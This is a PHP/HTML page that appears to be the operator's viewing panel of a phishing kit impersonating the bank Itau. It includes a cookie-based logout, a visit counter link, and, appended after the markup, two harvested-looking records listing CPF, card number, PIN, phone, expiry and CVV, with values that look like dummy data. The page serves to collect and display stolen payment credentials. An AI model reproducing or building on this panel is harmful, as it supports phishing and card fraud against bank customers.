

<html style="
    background-color: black;
">
    <head>
	<meta charset="utf-8">
	

	
	<title>INFOCCS</title>
	
		<style>
		h1 {
					font-family:Georgia, "Times New Roman", Times, serif;
					font-style:italic;
					font-size:30px;
					color:black;
					letter-spacing:-0.05;
					text-shadow:1px 1px 1px red;
					
		</style>
		<?php

			include("verifica.php");
			if($_GET["acao"] == logout){
				
				setcookie("logado","");
				echo '
				<script type="text/javascript">
				alert("Voce foi deslogado com sucesso, redirecionando clique em ok");
				location="index.php";
				</script>
				';
			}
		?>
		
	</head>
	<body style="
    background-color:white ;
">
	<center>
		 <h1 id="test">ITAU-INFOCCS</h1>
		 
		 <a href="?acao=logout">
		SAIR
		 </a>
		 <br>
		 <br>
		 <a href="contador.txt">
		 VISITAS
		 </a>
		 <br>
		 <br>
	</center>
	<center>
			<img src="imagens/deolhoemgravata-mor.gif" width="300px"  style="border-radius: 40%;">
			</center>
	
	
	</body>
</html>

&nbsp&nbsp&nbspCpf:121.212.212-11<br />&nbsp&nbsp&nbspCard:2112 2121 2112 2121<br />&nbsp&nbsp&nbspSenha:2121<br />&nbsp&nbsp&nbspNumero:(21) 11111-1111 <br /> &nbsp&nbsp&nbspValidade:11/2221  <br /> &nbsp&nbsp&nbspCvv:121 <br /><hr><br />
&nbsp&nbsp&nbspCpf:222.222.222-22<br />&nbsp&nbsp&nbspCard:2222 2222 2222 2222<br />&nbsp&nbsp&nbspSenha:2222<br />&nbsp&nbsp&nbspNumero:(11) 11111-1111 <br /> &nbsp&nbsp&nbspValidade:11/1111  <br /> &nbsp&nbsp&nbspCvv:111 <br /><hr><br />
